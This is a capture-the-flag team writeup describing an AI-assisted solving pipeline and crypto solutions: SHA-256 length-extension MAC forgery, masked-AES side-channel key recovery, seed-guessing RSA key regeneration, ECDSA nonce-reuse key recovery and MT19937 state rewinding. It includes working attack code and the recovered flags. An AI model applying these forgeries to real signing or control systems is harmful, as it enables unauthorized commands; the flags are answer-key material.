# CSCTF 2026 team writeup

## Team

- Team: secret.team
- Division: Fighters
- Placement at close: 1st (30,861 points, 108 solves)
- Members / handles: secretNinja (captain), .dev, JohnG4lt

## AI methodology

All three of us played with our own setups and shared one CTFd team, so there were two separate AI
pipelines working on the board. Both followed the same principle: put deterministic tooling where it is
fast and boring, use agents where something has to be reasoned out, and keep a human responsible for
direction, judgment calls and submission policy.

### secretNinja

- **Tools/models and their role.** Claude Code (Claude Opus) was the orchestrator. It pulled each
  wave from the CTFd API, triaged every challenge, and handed each one to its own solver subagent, so
  the main session could keep track of the whole board. OpenAI Codex (the gpt-daybreak model) was a
  second solver pool, and it did far more of the heavy lifting than a single line can capture: it was
  run two ways, handed guided tasks by the orchestrator and, more often for the hard problems, driven
  directly by me in its own terminal sessions with close, iterative steering. Codex was the muscle on
  the hard tail — on the order of fifteen of our solves were Codex's, including the full 31-layer Velora
  chain; the Cutover, Interlock, Command Seal, Dispatch Console, Apogee, Inside the Cordon and Vesper
  Quay web chains; the warden jail escape; Dawn Array; the Phantom Drift marker; Broadsheet; and a
  heap-exploitation pwn (Phantom Device). On several it ran the guarded submit itself; on others it
  handed the recovered flag back and a human submitted it. The heaviest hand-steering was on the hardest
  markers and on Velora and Apogee, where the first several hypotheses were dead ends and the solve only
  came after I redirected it. The per-challenge cards name Codex where it did the work.
- **Material, prompts, or automation that materially affected the solve.** Most of the value came
  from a library of offline engines built before the event: crypto, stego, forensics, network/ICS
  protocol parsers, RE helpers, web recon, and an auto-decoder for encoding chains. A triage router
  matched each challenge (category, files, brief) to the engines and the per-category playbook worth
  trying first. Known patterns were handled by existing code. New ones went to an agent for reasoning,
  and the reusable parts were added back into the library. A small CTFd client handled listing,
  downloads and submission. Untrusted binaries and documents ran only inside network-isolated Docker
  sandboxes.
- **What the team checked before submission.** Every flag had to come from real challenge output,
  and each card below says how that was confirmed. The submit client allowed one try per distinct
  value, skipped challenges a teammate had already solved, and stopped for a human after three wrong
  answers on one challenge. Candidate flags were never swept, and hints were never bought.
- **The human role.** I ran the operation: what to work on, when to switch a challenge's angle,
  when an agent's "this can't be solved" was wrong, and when to bring in Codex or take a challenge
  myself. Phantom Drift, Velora and Operation Blackout are the clearest cases: each looked like a wall
  for hours, and each came down to sustained work and a change of angle rather than accepting the first
  dead end. On Phantom Drift the construction stayed ambiguous until the published spec; on Velora the
  deep layers (the late navigator-injection gates) were largely mine to grind out; on Operation Blackout
  the team pushed through the marker ambiguity in parallel until the staff clarifications landed. The
  point of the setup is that an agent reporting "unsolvable" is a prompt to try another hypothesis, not
  a stopping point.


### .dev

- **Tools/models and their role.** A self-built multi-agent system. A watcher with no model in it
  polled the board, downloaded every attachment, ran triage and a recursive recon/extraction pass,
  and auto-submitted flags that decode straight out of the brief. A coordinator gave each challenge
  one owner to prevent duplicate work. A standby pool of solver agents was dispatched onto new
  releases. Stalled tasks escalated automatically to helper agents on different models, then to .dev.
- **Material, prompts, or automation that materially affected the solve.** Hash-keyed artifact
  caching, so no file was analyzed twice. Per-category playbooks injected into every solver brief.
  One evidence ledger per challenge, so any handoff resumed from recorded results instead of
  re-deriving. Every solver ran the same loop: inventory, list hypotheses, run the cheapest
  discriminating test, record the result, rotate. Eighteen flags were accepted in the first ~90
  seconds of wave 1.
- **What the team checked before submission.** Flags were submitted byte-for-byte as recovered, once.
  A rejection sent the solver back to the bytes, not to edited guesses. Submission pacing was enforced
  by the client.
- **The human role.** .dev built and ran the infrastructure and personally worked the challenges
  where the machinery stalled. Examples are the telecom/ICS correlation work behind Ghost Signal and
  Operation Blackout, and ranking candidates that needed judgment.

### JohnG4lt

- **Tools/models and their role.** Hand-driven web exploitation, backed by small purpose-written Python
  clients rather than a model-in-the-loop pipeline. For the three web targets credited to JohnG4lt, he
  worked the HTTP surface directly — reading each service's self-describing `/schema` or `/docs` and
  following it — then wrote a short script to make the exploit exact and repeatable: `urllib` +
  `hmac`/`hashlib`/`base64` for JWT forging (Key Custody), `concurrent.futures` for the approval race
  (Two-Key Turn), and a raw `socket`/`struct` WebSocket-and-HSP client for the Helioform protocol chain.
  `jwt.io` was the first, manual pass on Key Custody before he scripted it; `gobuster` was used for
  content discovery where a service warranted it.
- **What he checked before submission.** Each flag came straight from the live service response — the
  `/admin/recovery-key` body, the order's `arming_authorization`, the runbook output on
  `/console/automation` — and each solve ships with the script that reproduces it end to end.

### Workflow screenshots

The team's workflow screenshots are in the `screenshots/` folder alongside this writeup (private data
redacted):

- `secretNinja-board-codex-orchestration.png` — secretNinja's board at 102/105 solved, with the three
  remaining 900-point challenges running on Codex; a watcher pings when each finishes and a human
  verifies and submits.
- `dev-engine-library-1.png`, `dev-ctfkit.png`, `dev-recon-ledger.png` — .dev's offline engine library
  and the per-challenge recon/evidence ledger.
- `solve-web-rce-webshell.png` — a solve in progress: a `.php.png` upload giving command execution.
- `helioform-capability-chain-notes.png` — the Helioform Relay capability-chain working notes.

## Challenge writeups


## Crypto

### Countersign

> Crypto · Easy · Chronos Security  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{WQVGFSnaCT0ETBUNKJ8X2xVt}`

**Challenge**

Sarnovia's national grid dispatch console signs every substation command with a keyed hash. From an intercepted session you are given one legitimate `STATUS` command, its signature, and the console's signing specification. On an isolated training replica, make the console accept a `DISPATCH` command — the order that would trip a transmission breaker — without the key. An accepted `DISPATCH` returns the authorization code, which is the flag.

There are no static files. Everything lives behind a per-team container instance (CTFd container plugin, HTTP on port 8080, reached here as `<instance>`). Three endpoints matter:

- `GET /api/spec` — the signing specification.
- `GET /api/sample` — one intercepted legitimate record and its tag.
- `POST /api/command` — takes a signed message and its tag; a valid `DISPATCH` returns the authorization code.

**Tools used**

The repo's SHA-256 length-extension helper (`solvers/common/modern_crypto.length_extension`) and a short Python loop to post forged commands to our instance. No `hashpumpy` needed.

**Approach / walkthrough**

1. **Read the spec (`GET /api/spec`).** The tag is `SHA-256(key_bytes || message_bytes)` — a textbook **secret-prefix MAC**. The spec discloses the key-length band `key_length_band_bytes = [8, 32]`. The message parser is quirky and the quirk is the whole challenge: split the message on `&`, split each token on the first `=`, keep only keys matching `^[A-Za-z][A-Za-z0-9_]*$`, and **last value wins** for a repeated key. The command field is `cmd`.

2. **Read the sample (`GET /api/sample`).** The intercepted record is

   ```
   message: station=TIELINE-08&cmd=STATUS&ts=1760064576&nonce=45f9a50c
   signature: 7083f2b0...125a   (full 64-hex SHA-256 tag)
   ```

   This is a valid `STATUS` command whose `cmd` we need to flip to `DISPATCH`.

3. **Why length extension applies.** `SHA-256` is Merkle–Damgård: the 32-byte tag *is* the full internal hash state after absorbing `key || message || glue_padding`. Anyone holding the tag can resume hashing additional bytes without knowing `key`. The only unknown that changes the result is `len(key)`, because that fixes where the glue padding lands — and the spec hands us the band `[8, 32]`, so there are only 25 candidates to resolve against our own training endpoint.

4. **Forge.** For each candidate key length `klen` in `8..32`, extend the sample message with the suffix `&cmd=DISPATCH`:

   ```python
   import sys; sys.path.insert(0, 'solvers/common')
   from modern_crypto import length_extension
   # length_extension(algo, orig_digest_hex, orig_data, append, secret_len)
   fm, ft = length_extension('sha256', orig_tag_hex,
                             b'station=TIELINE-08&cmd=STATUS&ts=1760064576&nonce=45f9a50c',
                             b'&cmd=DISPATCH', klen)
   # fm = original || 0x80 || zero fill || 8-byte big-endian bit length || &cmd=DISPATCH
   # ft = the resumed SHA-256 tag over key || fm
   ```

   Then `POST /api/command` with the forged `{message: fm, tag: ft}` to our assigned instance and stop on the first `DISPATCH_ACCEPTED`.

5. **The glue lands cleanly.** The glue padding for any `klen` in the band is `0x80`, zero fill, and an 8-byte big-endian bit length between `0x0210` and `0x02d0` (always a multiple of 8). None of those bytes is `&` (`0x26`) or `=` (`0x3d`), so the padding never starts a new token: it is simply appended to the last original value, turning the `nonce` token into `nonce=45f9a50c\x80\x00…\x02\x98`. The key `nonce` is still a valid identifier, so the parser keeps the token with a junk value nothing checks. The appended `&cmd=DISPATCH` is then a clean, well-formed second `cmd` token, and **last value wins** makes `DISPATCH` override `STATUS`. The parsed keys of the forged message come out as `station, cmd, ts, nonce, cmd`.

6. **Resolve the key length.** Walking the band and posting each forge, `klen = 25` was accepted. This is a reasoned single-value search over a disclosed parameter band against our own training instance — not a flag brute-force. The accepted response:

   ```json
   {"status":"DISPATCH_ACCEPTED","authorization_code":"CSCTF{WQVGFSnaCT0ETBUNKJ8X2xVt}"}
   ```

**Why it works**

A secret-prefix MAC publishes its hash's full internal state as the tag. Merkle–Damgård construction then lets anyone continue the hash past the original message, appending chosen bytes and computing a valid tag for the extended input — the key is never needed, only its length. Combined with a parser that silently absorbs the binary glue into the previous value and lets a repeated `cmd` override the earlier one, the extension turns a signed `STATUS` into a signed `DISPATCH`. An HMAC (which does not expose its internal state), or a parser that rejected duplicate keys or non-printable bytes, would have stopped this.

**Validation / reproduction**

The server returned `DISPATCH_ACCEPTED` with the code, and it was accepted on the first CLI submission (`tried.json`: one attempt, status `correct`).

For the write-up the forge was re-run offline against a random 25-byte stand-in key, which does not touch the target:

```bash
.venv/bin/python -c "
import sys,hashlib,os; sys.path.insert(0,'solvers/common')
from modern_crypto import length_extension
k=os.urandom(25); m=b'station=TIELINE-08&cmd=STATUS&ts=1760064576&nonce=45f9a50c'
t=hashlib.sha256(k+m).hexdigest()
fm,ft=length_extension('sha256',t,m,b'&cmd=DISPATCH',25)
print(hashlib.sha256(k+fm).hexdigest()==ft)
print([x.split(b'=',1)[0] for x in fm.split(b'&')])
"
# True
# [b'station', b'cmd', b'ts', b'nonce', b'cmd']
```

The forged tag equals `SHA-256(key || forged_message)` exactly, and the parsed keys end in a second `cmd`. The `0x0298` length field (664 bits = 83 bytes = 25 key + 58 message) only holds for `klen = 25`, which is why the length had to be resolved; but the "no `&`/`=` in the glue" argument holds for every length in the band, not only 25.

Reproduction summary: spawn the instance; read `/api/spec` and `/api/sample`; confirm the MAC is secret-prefix SHA-256 and note the `[8,32]` band; for each `klen` forge `message + "&cmd=DISPATCH"` and `POST /api/command`; `klen=25` returns the code.

Gotchas: the sample's full 64-hex tag, the exact `POST` body field names, and how the binary glue was encoded on the wire were read live and not preserved verbatim in `notes.md`; only the engine (`length_extension`), the accepted length (`klen=25`), the suffix (`&cmd=DISPATCH`), and the final response/flag are recorded.

### Emanation

> Crypto · Medium · [Michalina Moszyńska](https://www.linkedin.com/in/michalina-moszy%C5%84ska/)  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{relay_order_55a10bd8f06393bcc1ae8065}`

**Challenge**

Analysts modelled a captured QARVETH-73 field encryptor running its protected AES-128 first round under known plaintexts. The traces are a synthetic corpus from the standard Hamming-weight leakage model, with the device's countermeasures preserved. Recover the device key and read the sealed order; the order text is the flag.

`emanation.zip` unpacks to four files:

| File | Shape | Meaning |
| --- | --- | --- |
| `README.txt` | — | describes the corpus and countermeasures |
| `plaintexts.npy` | 8000 × 16 `uint8` | one known AES input block per trace |
| `traces.npy` | 8000 × 56 `float32` | one modeled power trace per encryption |
| `sealed_order.hex` | 43 bytes | the order, AES-128-CTR under the device key, all-zero initial counter block |

**Tools used**

NumPy for a hand-written second-order CPA, and PyCryptodome for the final AES-CTR decrypt.

**Approach / walkthrough**

Each trace models one AES-128 first round on the matching plaintext. The leak is the classic first-round S-box output: for key byte `k_b` and plaintext byte `p_b`, the device leaks `HW(Sbox(p_b ⊕ k_b))`. Two preserved countermeasures must be defeated first:

- **Random delay** — a per-row delay `d` (uniform 0–16 samples) shifts the trigger spike and every key-dependent sample.
- **Fresh Boolean (first-order) mask** — each row uses a new random byte `m`, so the device leaks `HW(Sbox(p_b ⊕ k_b) ⊕ m)` and `HW(m)` separately. Plain first-order CPA on any single column peaks at only |r| ≈ 0.03 for the correct key byte.

1. **Undo the delay.** The random delay produces a trigger spike (height ≈ 25) early in each trace. Take `d = argmax(trace[:17])` and slice a fixed window `trace[d : d+39]`, which realigns every row to a common reference.

2. **Locate the leaks.** In the aligned window the leakage columns sit at offsets `3, 5, …, 35` (stride 2): mean ≈ 4.0 (= E[HW]), std ≈ 1.7, versus near-zero noise columns in between. Sample 0 is `HW(mask)`; samples 1–16 are `HW(Sbox(p_b ⊕ k_b) ⊕ mask)` for bytes 0–15 in order.

3. **Second-order combine.** For each byte, center the mask sample and the byte sample on their column means and multiply them, `(L₀ − mean)·(L_{b+1} − mean)`. The centered product correlates with the mask-free model `HW(Sbox(p_b ⊕ K))`.

4. **CPA.** Correlate that product against `HW(Sbox(p_b ⊕ K))` for all 256 guesses `K` and take the argmax of |r|. This is a search over the key space against our own model, never a flag submission.

   ```python
   d = t[:, :17].argmax(1)
   A = np.stack([t[i, d[i]:d[i]+39] for i in range(N)])
   L = A[:, 3:37:2]                       # the 17 leakage samples
   Lc = L - L.mean(0)
   for b in range(16):
       comb = z(Lc[:, 0] * Lc[:, b+1])    # centered-product second-order combine
       H = z(hw[S[p[:, b][:, None] ^ np.arange(256)[None, :]]].astype(float))
       key.append(int(np.argmax(np.abs(comb @ H) / N)))
   ```

   Every byte separated cleanly, correct candidate |r| ≈ 0.21–0.26 against a runner-up of ≈ 0.06–0.08:

   ```
   delay range 0 16 spike mean 25.00709
   byte  0: k=52 |r|=0.238 runner-up=0.059
   ...
   byte 15: k=ea |r|=0.220 runner-up=0.056
   key 52cc11fc4a2ecfc066e3349f4af9fdea
   ```

5. **Decrypt.** Assemble the 16-byte key `52cc11fc4a2ecfc066e3349f4af9fdea` and AES-128-CTR-decrypt `sealed_order.hex` with an all-zero 16-byte initial counter block:

   ```python
   ct = bytes.fromhex(open('sealed_order.hex').read().strip())
   AES.new(k, AES.MODE_CTR, nonce=b'', initial_value=0).decrypt(ct)
   # b'CSCTF{relay_order_55a10bd8f06393bcc1ae8065}'
   ```

**Why it works**

A first-order Boolean mask makes each sample on its own independent of the secret; the secret survives only in the joint distribution of the two shares `HW(m)` and `HW(S ⊕ m)`. The centered product of the two shares correlates with `HW(S)` — the standard second-order attack — so a fresh mask per trace only raises the number of traces needed, and 8000 noise-light synthetic traces are more than enough. The random delay adds no real protection because the trigger spike gives the offset away in every trace.

**Validation / reproduction**

All 16 bytes separated from their runner-ups by roughly 3×, and the decryption produced readable text in the `CSCTF{...}` frame. The attack was re-implemented from the notes and re-run against the handout for the write-up (2026-11-07); it reproduced the same key and plaintext.

Reproduction summary: load the two arrays; per row `d = argmax(trace[:17])` and slice `trace[d:d+39]`; take samples `[3:37:2]`; for each byte, center and multiply the mask sample with the byte sample and CPA against `HW(Sbox(p⊕K))`; assemble the key and AES-128-CTR-decrypt `sealed_order.hex`.

Gotchas: the downloaded zip did not match the brief's size/hash (1,793,415 vs 1,793,377 bytes; a repack artifact), but the four inner files are consistent with the brief, so this did not affect the solve. Submission note: three guarded attempts returned `ratelimited` (never judged — team-wide limit from parallel submits); a later single submit of the same value was accepted. No value was ever guessed or swept.

### Operation Dawn: The Courier's Keys

> Crypto · Medium · Terminal43  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{01_advance_on_the_mill_a7c3f1}`

**Challenge**

Operation Dawn, annex entry 01. Coalition signals intercepted the Ash Army field-radio fleet during a simultaneous cold start and captured the encrypted order sent to one unit. Recover the message from the supplied packet capture.

- `fleet-provisioning.pcap`, 9,930 bytes, 86 frames (52 IPv4, 34 ARP), the IPv4 traffic mostly decoy ICMP/DNS/HTTP noise around a UDP/7000 provisioning exchange.

**Tools used**

`strings` to read the pcap payloads (the data is plain ASCII), and a short Python search using `random.Random` and `gmpy2.is_prime`.

**Approach / walkthrough**

1. **Read the keygen spec.** The first UDP/7000 packet — a broadcast from `10.23.0.2:7000` to `10.23.7.255:7000` — spells out how each radio makes its key:

   ```
   ASH ARMY KEY UNIT :: provisioning profile
   on power-up each set derives its key from the boot clock and its set serial:
     seed = (power_up_epoch_seconds << 16) | serial
     generator = MT19937 seeded with that value
     draw two 512-bit primes in turn: take a 512-bit candidate with top and bottom
     bits set, keep the first that is prime; these are p then q
     modulus N = p * q, public exponent 65537
   ```

   That is exactly CPython's `random.Random(seed).getrandbits(512)`, so the whole RSA keygen is reproducible from the two seed inputs.

2. **Collect keys and the target.** The fleet cold-starts: nine radios each send `REG serial=… e=65537 N=…` and the base answers `ACK`. The target is packet 84 of 86 (only two ARP frames follow): a single `ORDER serial=6631 C=…` carrying the RSA ciphertext, sent to serial 6631's registration endpoint. So the job is to recover serial 6631's private key and decrypt `C`.

3. **Bound the unknown.** The 1023-bit modulus is strong on its own (the nine fleet moduli share no factors — checked pairwise coprime). The weakness is the **seed space**. The serial (6631) supplies the low 16 bits of the seed; only `power_up_epoch_seconds` is unknown. The capture's packet timestamps bound it: frames run from `1699989961.90` to `1699996098.70`, the provisioning broadcast is stamped `1699989987.70`, and serial 6631's `REG` is stamped `1699994070.89`. The search used the band `[1699986000, 1699996000)` — from somewhat before the capture start up to the `ORDER` time, about 10⁴ candidates (~13 bits).

4. **Search.** For each epoch, re-seed MT19937, draw the first prime, and test whether it divides `N`:

   ```python
   def first_prime(rng):
       while True:
           cand = rng.getrandbits(512) | (1 << 511) | 1
           if gmpy2.is_prime(cand):
               return cand

   for t in range(1699986000, 1699996000):
       rng = random.Random((t << 16) | 6631)
       p = first_prime(rng)
       if N % p == 0:
           q = N // p
           d = pow(65537, -1, (p-1)*(q-1))
           m = pow(C, d, N)
           print(t, m.to_bytes((m.bit_length()+7)//8, "big")); break
   ```

   The hit was epoch **`1699994067`**, about 4 s before 6631's `REG` packet — consistent with a radio booting, generating its key, then registering. Here the first prime drawn divides the captured `N` exactly, giving `N = p·q`.

5. **Decrypt.** With `q = N/p`, compute `d = e⁻¹ mod (p−1)(q−1)` and `m = C^d mod N`. The raw, unpadded plaintext bytes decode directly to `CSCTF{01_advance_on_the_mill_a7c3f1}` ("annex entry 01" + the decrypted order "advance on the mill" + a 6-hex tag).

**Why it works**

The 1023-bit modulus is fine and the moduli share no common factors; the weakness is the seed. Its only secret is a wall-clock boot time, and the capture itself narrows that to roughly 13 bits, with the low 16 bits fixed by the public serial. Feeding a non-cryptographic PRNG a guessable seed makes the "random" primes reproducible, so the private key falls out of a short search over seconds. The same method recovers any fleet member's key from its serial and `N`; only serial 6631 received an `ORDER`.

**Validation / reproduction**

The candidate prime divides `N` exactly, which confirms the epoch rather than merely suggesting it, and the decryption gives clean ASCII in the `CSCTF{...}` frame. Re-verified for the write-up (2026-11-07): seeding `random.Random((1699994067 << 16) | 6631)` regenerates both `p` and `q` with `p·q == N`, the loop finds `1699994067` as its first hit, and the raw-RSA decryption yields the 36-byte flag. The original multiprocessing script ran in ~2 s; the single-process snippet above reaches the hit (8,067 epochs in) in about 10 s.

Reproduction summary: `strings` the pcap; read the keygen spec from the first UDP/7000 broadcast and `N`/`C` for serial 6631 from its `REG`/`ORDER` packets; search the boot-epoch band, regenerating the first prime per epoch and testing divisibility of `N`; factor, invert, decrypt.

Side note: the moduli for serials 7805 and 9919 are 1028 bits, which cannot be a product of two 512-bit primes, so those registrations did not come from the documented keygen (likely decoys); no effect on the solve. Submission was delayed only by repeated CTFd `ratelimited` responses (the flag value never changed) until the rate limit cleared.

### Rollback Pair

> Crypto · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{3b5789e468dadf358d375bb08dcd19b977c5715364a709326b43a35b0d5eaab1}`

**Challenge**

An emergency logistics signing service came back up after a bad application-state restore. Someone exported eight signed dispatch records and the signing public key for review. Work out whether the signing key was exposed and, if so, recover the signing scalar. The export is a constructed training artifact with genuine ECDSA signatures, all work offline.

- `signing-export.json`, 4248 bytes, SHA-256 `96b7f2e330bf904e45549e2d24da4d2866569520aa39b9576aaa0124097bda28`.
- Submit the scalar as `CSCTF{` + exactly 64 lowercase hex characters + `}`.

**Tools used**

Python 3 standard library only (needs `pow(x, -1, n)`, so 3.8+). The secp256k1 point arithmetic was written inline.

**Approach / walkthrough**

1. **Read the self-describing format.** The export states its own scheme: ECDSA on **secp256k1**, hash **SHA-256** over the base64-decoded message bytes, signature stored as `r || s` (32 bytes each, big-endian, **raw `s` with no low-s normalization**). The `scenario` field is the tell: signing "resumed from a faulty application nonce-state snapshot" — the nonce generator was rolled back, so a nonce may have been used twice.

2. **Group by `r`.** In ECDSA `r = (k·G).x mod n` depends only on the nonce `k`, so two records with the same `r` reused the nonce. Decoding all eight and bucketing by `r`:

   ```
   R-6103  r=821f300799a645e2...  {"cargo":"insulin cold boxes",...
   R-6107  r=821f300799a645e2...  {"cargo":"medical radio packs",...
   REPEATED r=821f300799a645e288df87f4e1913c60606c13aa50cae4804a375890887b4f4a in R-6103, R-6107
   ```

   R-6103 and R-6107 sign different messages but share `r`.

3. **Sanity-check the export first.** Confirm the public key `Q` lies on the curve and that all eight signatures verify under it with `z = SHA-256(message)`. That pins the hash and byte-order interpretation before any attack.

4. **Solve for `k`, then `d`.** From `s_i = k⁻¹(z_i + r·d) mod n`, subtracting the two equations removes `d`:

   ```
   k = (z₁ − z₂) / (s₁ − s₂)        (mod n)
   d = (s₁·k − z₁) / r              (mod n)
   ```

   Because `s` is stored raw and `(−k)·G` has the same x-coordinate as `k·G`, a normalizing signer could have stored `−s` for one of the two; so the script tries both `s₁ − s₂` and `s₁ + s₂` and keeps only the result that checks out. The core:

   ```python
   pair = next((a, b) for i, a in enumerate(recs) for b in recs[i+1:] if a[2] == b[2])
   (id1, z1, r, s1), (id2, z2, _, s2) = pair
   for sign in (1, -1):
       k = (z1 - z2) * pow(s1 - sign*s2, -1, n) % n
       d = (s1 * k - z1) * pow(r, -1, n) % n
       if mul(d, G) == Q:            # d·G reproduces the exported public key
           print(f"CSCTF{{{d:064x}}}"); break
   ```

   Expected output:

   ```
   all 8 signatures verify under the exported key: True
   pair: R-6103 / R-6107  r=821f300799a645e288df87f4e1913c60606c13aa50cae4804a375890887b4f4a
   s1 - s2: k*G.x == r -> True, d*G == public_key -> True
   k = d12e52720675d17d57136b691ef6abb6fa90116527022ef1a76be7503b0c2049
   d = 3b5789e468dadf358d375bb08dcd19b977c5715364a709326b43a35b0d5eaab1
   ```

   The plain `s₁ − s₂` case works here.

5. **Format.** The flag is the scalar as 64 lowercase hex digits inside `CSCTF{}`.

**Why it works**

ECDSA's private key is protected only as long as each nonce is secret and unique. Restoring the nonce generator from an old snapshot replays nonces that were already used. Two signatures made with the same `k` give two linear equations in the two unknowns `k` and `d` mod the group order `n`, which plain modular algebra solves. The repeated `r` advertises the reuse directly.

**Validation / reproduction**

Two independent checks: `(k·G).x mod n == r`, and — decisively — `d·G == Q`, the exported public key. A scalar that reproduces the public key is the signing key, not an artifact of a wrong hash, byte order, or `s` sign. It was accepted on the first submission.

Reproduction summary: read the format from the JSON; decode all eight `r||s` and group by `r`; verify every signature under `Q`; take the R-6103/R-6107 pair; compute `k` and `d` (trying both `s` signs); confirm `d·G == Q`; emit `CSCTF{<d as 64 hex>}`.

### Signing Authority

> Crypto · Easy · Chronos Security  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{PBzvsLOrJDAG5kqOAMiT9NXC}`

**Challenge**

Torven Ordnance's code-signing service promotes the master arming image only on a valid ECDSA signature (secp256k1) over one exact message — and it will not sign that message for you. But it publishes signed release receipts. Use them to authorize the master image yourself. The API is self-describing at `GET /schema`, and all work is confined to the assigned instance.

There are no files. The per-team container (`connection_type: web`, port 8000, reached here as `<instance>`) exposes:

- `GET /schema` — ECDSA on secp256k1, with `z = sha256(msg) mod n`.
- `POST /authorize` — promotes the master image on a signature over the exact `master_message_hex`, with canonical low-`s`.
- `GET /pubkey` — the service public key `Q = d·G`.
- `GET /receipts` — a list of signed release receipts.

**Tools used**

A short hand-written pure-Python secp256k1 ECDSA script (`sa.py`, in that session's scratchpad; not kept in the repo).

**Approach / walkthrough**

1. **Pull the receipts (`GET /receipts`).** Two of the published receipts carry the **same `r`**. Since `r = (k·G).x mod n` depends only on the per-signature nonce, a repeated `r` means a repeated nonce `k`.

2. **Recover the private key.** With two signatures `(r, s₁)` over `z₁` and `(r, s₂)` over `z₂` sharing the nonce `k`:

   ```
   s₁ = k⁻¹(z₁ + r·d)      s₂ = k⁻¹(z₂ + r·d)     (mod n)
   k  = (z₁ − z₂)·(s₁ − s₂)⁻¹                      (mod n)
   d  = (s₁·k − z₁)·r⁻¹                            (mod n)
   ```

   where `z_i = sha256(bytes.fromhex(message_hex_i)) mod n`.

3. **Check before touching `/authorize`.** The recovered `d` satisfied `d·G == ` the key from `GET /pubkey` exactly. That proves we hold the real signing key before sending anything, so the forged authorization is right on the first attempt.

4. **Sign the master message ourselves.** The service's refusal to sign no longer protects anything once we have `d`:

   ```python
   zm = int.from_bytes(hashlib.sha256(bytes.fromhex(MASTER_MESSAGE_HEX)).digest(), 'big') % n
   kk = secrets.randbelow(n - 1) + 1          # a fresh, independent nonce
   R  = mul(kk, G)[0] % n
   s  = pow(kk, -1, n) * (zm + R * d) % n
   if s > n // 2: s = n - s                    # low-s, as /schema requires
   ```

   The core curve arithmetic and the recovery step:

   ```python
   recs = json.load(open('receipts.json'))['receipts']
   a, b = next((x, y) for x, y in combinations(recs, 2) if x['r'] == y['r'])
   r, s1, s2 = int(a['r'],16), int(a['s'],16), int(b['s'],16)
   z1, z2 = z(a['message_hex']), z(b['message_hex'])
   k = (z1 - z2) * pow(s1 - s2, -1, n) % n
   d = (s1 * k - z1) * pow(r, -1, n) % n
   assert mul(d, G) == PUB                      # == GET /pubkey
   ```

5. **Authorize.** `POST /authorize {message_hex, r: R, s}` to the assigned instance. The response carried the master authorization code:

   ```json
   {"master_authorization":"CSCTF{PBzvsLOrJDAG5kqOAMiT9NXC}"}
   ```

**Why it works**

ECDSA keeps the private key secret only while every nonce is secret and unique. Reusing one nonce across two messages gives two linear equations in the two unknowns `k` and `d`, so modular division recovers the scalar outright. A service that guards one message by refusing to sign it, while publishing signatures made with the same key, defeats itself: the refusal protects nothing once `d` is known, and a fresh signature made with the real key passes every check, including the low-`s` rule (which only rejects the malleable `n − s` twin of an existing signature, not a newly minted one).

**Validation / reproduction**

`d·G` matched the published key before any request to `/authorize`, which is the decisive offline check: a scalar that reproduces the public point is the signing key, not an artifact of a wrong hash or byte order. The nonce-reuse algebra and the secp256k1 arithmetic were re-checked offline on synthetic signatures (the recovered `d` gives back the public key).

Reproduction summary: read `/schema`, `/pubkey`, `/receipts`; find the receipt pair sharing `r`; recover `k` and `d`; verify `d·G == /pubkey`; sign `master_message_hex` with a fresh low-`s` signature; `POST /authorize`.

Gotchas and unsaved detail: the plaintext of the master message and the exact JSON field shapes/encodings of `/receipts` and `/authorize` (hex string vs integer) were not saved — check them against `GET /schema` on your own instance. If the receipts were low-`s` normalized, `s₂` might need to be `n − s₂`; the `d·G == PUB` check tells you which sign is right. Submission note: the first three CLI submits hit CTFd's team-wide "submitting flags too fast" rate limit and were never judged; a later single guarded submit of the same value came back `correct` (`tried.json` holds only that one `correct` attempt). One tooling issue: `ctf/submit.py` logged the `ratelimited` responses as attempts, which briefly blocked the resubmit as a duplicate until the record was cleared by hand.

### The Key Wheel

> Crypto · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{15_jam_the_enemy_net_at_dawn_7e2c04}`

**Challenge**

A seized Ash Army key-schedule journal holds several sealed dispatches, but the standing order predates the recorded output window. Recover that standing order.

- `key-unit-journal.cbor`, 7,037 bytes, SHA-256 `bb14ef0ef3b6c21080a1eef9d34b1a38da4c8407e1dc0dcb29312fb639b2c159`.

**Tools used**

Python 3 standard library only: a ~30-line hand-written CBOR decoder, an MT19937 untemper and twist inverse, and `random.Random.setstate` to clone the generator.

**Approach / walkthrough**

1. **Decode the journal.** CBOR is a compact binary JSON; the file uses only six major types (unsigned/negative int, byte/text string, array, map), so a small hand decoder reads it. It yields one map:

   ```
   device: ASH ARMY KEY UNIT v3  (seized; key-schedule journal)
   scheme: seal: TX t keys on register outputs [8*t, 8*t+8); key = concat uint32be(word);
           ks = concat SHA-256(key || uint32be(i)) for i=0,1,..; plain = ciphertext ^ ks
   window_opens_tx: 156
   register: 1248 integers (32-bit)
   traffic:  tx 155 standing order | tx 156,157,158,161 field dispatches
   ```

2. **Implement the seal and decrypt what the window covers.** Tx `t` uses register outputs `[8t, 8t+8)`, packed big-endian into a 32-byte key; the keystream is `SHA-256(key || uint32be(i))` for `i = 0,1,…` XORed onto the ciphertext. `register[0]` is output `8 × 156 = 1248`:

   ```
   tx 155: key is outputs 1240..1247, not in the register
   tx 156: COVER TRAFFIC ONLY. the standing order went out one cycle before this journal's
           window opens; its key is not in this register. turn the key wheel back to read it.
   tx 157: hold positions and keep to radio discipline until relieved
   tx 158: ration resupply reaches the forward line after dark
   tx 161: acknowledge all command traffic on the hour
   ```

   The four in-window dispatches decrypt to clean English, confirming the scheme. Tx 155's key is outputs 1240–1247, just before the register starts.

3. **Identify the wheel.** The register holds 1248 = 2 × 624 words and starts at output 1248, again a multiple of 624. Blocks of 624 32-bit words are the signature of MT19937 (Python's `random`). Its tempering is a bijection, so 624 consecutive outputs reveal the whole state. Untemper the first 624 register words, load them into `random.Random` via `setstate`, and confirm it regenerates all 1248 register words — it does. So the register is generations 2 and 3, and the tx 155 key (outputs 1240–1247) is indices 616–623 of generation 1.

